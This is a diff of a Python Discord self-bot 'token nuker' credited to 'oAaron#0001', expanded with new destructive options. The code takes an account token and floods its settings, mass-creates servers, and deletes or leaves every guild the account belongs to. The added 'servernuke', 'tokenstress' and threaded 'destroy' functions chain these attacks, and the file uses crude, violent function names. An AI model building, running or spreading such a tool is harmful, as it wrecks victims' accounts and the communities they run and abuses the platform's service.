@@ -1,31 +1,24 @@
-import discord
+import discord, threading, colorama, requests, time, os, json
 from discord.ext import commands
 from discord.ext import tasks
-import colorama 
-import random
-import string
-import asyncio
 from colorama import Fore 
-import requests
-import time
-import os 
-import json
 bot = commands.Bot(command_prefix="!", self_bot=True)
 bot.remove_command("help")
 
-## this mad me hard ##
+
 colorama.init()
 with open('config.json') as f:
     data = json.load(f)
     token = data["TOKEN"]
-
+    servername= data["SERVERNAME"]
+headers = {
+ 'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
+ 'Content-Type': 'application/json',
+ 'Authorization': token,
+}
 
 def tokenfuck():
-      headers = {
-      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
-      'Content-Type': 'application/json',
-      'Authorization': token,
-      }
+      global headers
       payload = {
           'theme': "light",
           'locale': "ja",
@@ -41,15 +34,12 @@ def tokenfuck():
           'explicit_content_filter': '0',
           'status': "idle"
       }
+      print(f"{Fore.GREEN}[+] {Fore.RED} Fucked Token")
       requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
       to_back()
 
 def sezuire():
-    headers = {
-      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
-      'Content-Type': 'application/json',
-      'Authorization': token,
-      }
+    global headers
     payload = {
       'theme': "dark"
       }
@@ -59,14 +49,11 @@ def sezuire():
     for i in range(1000):
       requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
       requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
+      print(f"{Fore.GREEN}[+] {Fore.RED} Sent Sezuire")
     to_back()
 
 def langrape():
-    headers = {
-      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
-      'Content-Type': 'application/json',
-      'Authorization': token,
-      }
+    global headers
     payload1 = {
           'locale': "ro"
       }
@@ -80,14 +67,11 @@ def langrape():
         requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload1)
         requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload2)
         requests.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload3)
+        print(f"{Fore.GREEN}[+] {Fore.RED} Raping Language")
     to_back()
 
 def statusrape():
-      headers = {
-      'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
-      'Content-Type': 'application/json',
-      'Authorization': token,
-      }
+      global headers
       payload = {
           'status': "dnd"
       }
@@ -108,50 +92,55 @@ def statusrape():
       to_back()
 
 def serverspam():
-    servername = input("ServerName>>")
-    headers = {
-    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
-    'Content-Type': 'application/json',
-    'Authorization': token,
-    }
+    global servername
+    global headers
     guild = {
     'name': f"{servername}"
-    }
+    } 
     for i in range(100):
      requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
      print(f"{Fore.GREEN}[+] {Fore.RED} Created Server Named {Fore.WHITE}{servername}")
     to_back()
-    
+def servernuke():
+ global headers
+ with open("servers.txt", "r") as f:
+    servers = f.read().splitlines()
+ for lines in servers: 
+   requests.post(f'https://discord.com/api/v9/guilds/{lines}/delete', headers=headers)
+   requests.delete(f'https://discord.com/api/v9/users/@me/guilds/{lines}', headers=headers)
+   print(f'{Fore.GREEN}[+] {Fore.RED}Nuked Guild > {lines}')
+   
+
+def tokenstress():
+ global headers
+ requests.post(f'https://discord.com/api/v9/invites/lol', headers=headers)
+ requests.post(f'https://discord.com/api/v9/invites/lgbtq', headers=headers)
+ requests.post(f'https://discord.com/api/v9/invites/astfolo', headers=headers)
+ requests.post(f'https://discord.com/api/v9/invites/hey', headers=headers)
+ requests.post(f'https://discord.com/api/v9/invites/lmao', headers=headers)
+
+
+def destroy():
+  threading.Thread(target=servernuke).start()
+  time.sleep(20)
+  threading.Thread(target=serverspam).start()
+  threading.Thread(target=statusrape).start()
+  threading.Thread(target=sezuire).start()
+  threading.Thread(target=langrape).start()
+  
+ 
 
 
 
 @bot.event
-async def on_ready():   
-  print(f'''
-  {Fore.RED}         oAaron Token Fuck Loader 
-  {Fore.RED}
-  {Fore.RED}         [1] Leave Guilds
-  {Fore.RED}         [2] Delete All Guilds
-  {Fore.RED}         [3] Go To Main Nuker
-  {Fore.RED}
-  ''')
-  shit = input(">>")
-  if shit == '1':
-   for times in range(100):
-    for guild in bot.guilds:
-     server = bot.get_guild(guild.id)
-     print(f"{Fore.GREEN}[+] Left Guild {Fore.RED} {server}")
-     await server.leave() 
-    to_back()
-  if shit == '2':
-   for times in range(100):
-    for guild in bot.guilds:
-     server = bot.get_guild(guild.id)
-     print(f"{Fore.GREEN}[+] Deleted Server {Fore.RED} {server}")
-     await server.delete() 
-    to_back()
-  if shit == '3':
-      to_back()
+async def on_ready():
+ os.remove("servers.txt")
+ for guild in bot.guilds:
+  server = bot.get_guild(guild.id)
+  print(f"{Fore.RED} [+] Scraped {server.id}")
+  f = open("servers.txt", "a+")
+  f.write(f"{server.id}\n")
+ HomeScreen()
 
 def to_back():
  HomeScreen()
@@ -159,36 +148,18 @@ def HomeScreen():
   os.system('cls')
   print(f'''
   {Fore.RED}
-  {Fore.RED}         ▄▄▄█████▓ ▒█████   ██ ▄█▀▓█████  ███▄    █                   
-  {Fore.RED}         ▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒ ▓█   ▀  ██ ▀█   █                   
-  {Fore.RED}         ▒ ▓██░ ▒░▒██░  ██▒▓███▄░ ▒███   ▓██  ▀█ ██▒                  
-  {Fore.RED}         ░ ▓██▓ ░ ▒██   ██░▓██ █▄ ▒▓█  ▄ ▓██▒  ▐▌██▒                  
-  {Fore.RED}          ▒██▒ ░ ░ ████▓▒░▒██▒ █▄░▒████▒▒██░   ▓██░                  
-  {Fore.RED}         ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░   ▒ ▒                   
-  {Fore.RED}        ░      ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░░ ░░   ░ ▒░                  
-  {Fore.RED}        ░      ░ ░ ░ ▒  ░ ░░ ░    ░      ░   ░ ░                   
-  {Fore.RED}           ░ ░  ░  ░      ░  ░         ░                   
-  {Fore.RED}                                                            
-  {Fore.RED}       █████▒█    ██  ▄████▄   ██ ▄█▀▓█████  ██▀███               
-  {Fore.RED}        ▓██   ▒ ██  ▓██▒▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒             
-  {Fore.RED}        ▒████ ░▓██  ▒██░▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒             
-  {Fore.RED}        ░▓█▒  ░▓▓█  ░██░▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄               
-  {Fore.RED}        ░▒█░   ▒▒█████▓ ▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒             
-  {Fore.RED}         ▒ ░   ░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░             
-  {Fore.RED}    ░     ░░▒░ ░ ░   ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░             
-  {Fore.RED}   ░ ░    ░░░ ░ ░ ░        ░ ░░ ░    ░     ░░   ░              
-  {Fore.RED}          ░     ░ ░      ░  ░      ░  ░   ░   
-  {Fore.RED}
-  {Fore.RED}
-  {Fore.RED}
-  {Fore.RED}                By oAaron#0001
-  {Fore.RED}               [1]  serverspam
-  {Fore.RED}               [2]  tokenfuck
-  {Fore.RED}               [3]  sezuire 
-  {Fore.RED}               [4]  langrape
-  {Fore.RED}               [5]  statusrape
-  ''')
-  shit = input(">>")
+  {Fore.RED}        ┌─┐┌─┐┌┬┐┌─┐┬  ┌─┐┌─┐  ┌┐┌┬ ┬┬┌─┌─┐┬─┐  ┌┼┐
+  {Fore.RED}        ├─┤└─┐ │ │ ││  ├┤ │ │  ││││ │├┴┐├┤ ├┬┘  └┼┐
+  {Fore.RED}        ┴ ┴└─┘ ┴ └─┘┴─┘└  └─┘  ┘└┘└─┘┴ ┴└─┘┴└─  └┼┘
+  {Fore.RED}                    By oAaron#0001
+  {Fore.RED}           ╔══════════════════════════════════╗
+  {Fore.RED}           |[1]  serverspam [2]  tokenfuck    |
+  {Fore.RED}           |[3]  sezuire    [4]  langrape     |
+  {Fore.RED}           |[5]  statusrape [6]  servernuke   |
+  {Fore.RED}           |[7] destroy     [8]  locktoken    |
+  {Fore.RED}           ╚══════════════════════════════════╝
+  ''')                           
+  shit = input("[$] >> ")
   if shit == '1':
     serverspam()
   if shit == '2':
@@ -199,7 +170,12 @@ def HomeScreen():
       langrape() 
   if shit == '5':
      statusrape()
-
+  if shit == '6':
+     servernuke()
+  if shit == '7':
+    destroy()
+  if shit == '8':
+   tokenstress()
 
 
 
